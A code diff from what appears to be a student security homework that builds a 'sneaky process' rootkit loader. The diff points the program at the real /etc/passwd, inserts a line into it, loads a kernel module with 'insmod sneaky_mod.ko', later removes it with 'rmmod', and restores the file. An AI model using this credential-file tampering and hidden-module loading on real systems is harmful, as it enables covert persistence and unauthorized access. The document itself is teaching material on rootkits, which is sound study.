@@ -36,17 +36,18 @@ bool restore_passwd(const char *original_passwd, const char *temp_passwd) {
 
 void sneaky_process(void) {
   printf("sneaky_process pid = %d\n", getpid());
-  // const char *original_passwd = "/etc/passwd";
-  // const char *temp_passwd = "/tmp/passwd";
+  const char *original_passwd = "/etc/passwd";
+  const char *temp_passwd = "/tmp/passwd";
 
   // Calling w/ temp values for now, before I crash it again :^)
-  const char *original_passwd = "/home/bg127/homework5-kit/test_src.txt";
-  const char *temp_passwd = "/home/bg127/homework5-kit/test_dst.txt";
+  // const char *original_passwd = "/home/bg127/homework5-kit/test_src.txt";
+  // const char *temp_passwd = "/home/bg127/homework5-kit/test_dst.txt";
   if (!insert_line(original_passwd, temp_passwd)) {
     return;
   }
-  const char *command = "ls"; // Change this w/ insmod command after its done
-  system(command);            // Don't need to wait after this
+  const char *insmod_command =
+      "insmod sneaky_mod.ko"; // Change this w/ insmod command after its done
+  system(insmod_command);     // Don't need to wait after this
 
   cout << "Looping until 'q' is received now" << endl;
   char c = 'a';
@@ -54,14 +55,8 @@ void sneaky_process(void) {
     cin >> c;
   }
 
-  // 4th step, this is the part I'm especially confused. After the sneaky module
-  // is loaded Read from keyboard 1 char at a time until received 'q'. Program
-  // exits the loop
-  // This is the chance to interact with the system while 1)sneaky process is
-  // running 2)sneaky kernel module is loaded. **This is the testing point for
-  // malicious behavior**
-
-  // 5th, unload sneaky kernel w/ rmmod
+  const char *rmmod_command = "rmmod sneaky_mod";
+  system(rmmod_command);
 
   restore_passwd(original_passwd, temp_passwd);
 }
